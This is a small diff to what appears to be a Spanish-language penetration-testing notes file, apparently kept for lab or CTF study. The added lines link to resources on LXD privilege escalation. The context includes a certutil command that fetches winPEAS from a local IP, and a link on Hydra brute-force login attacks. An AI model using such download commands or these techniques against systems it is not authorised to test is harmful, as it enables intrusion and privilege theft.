@@ -110,3 +110,8 @@ certutil -urlcache -split -f http://192.168.200.3/winPEASx64.exe C:\Users\hacker
 
 ## Página donde ver ataque de fuerza bruta con hydra a diferentes tipos de login:
 [Hydra Brute Force Login Attacks](https://www.manrajbansal.com/post/how-to-use-hydra-to-brute-force-login-forms)
+
+## Escalada de privilegios mediante lxc
+[HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
+[Juggernaut](https://juggernaut-sec.com/lxd-container/)
+
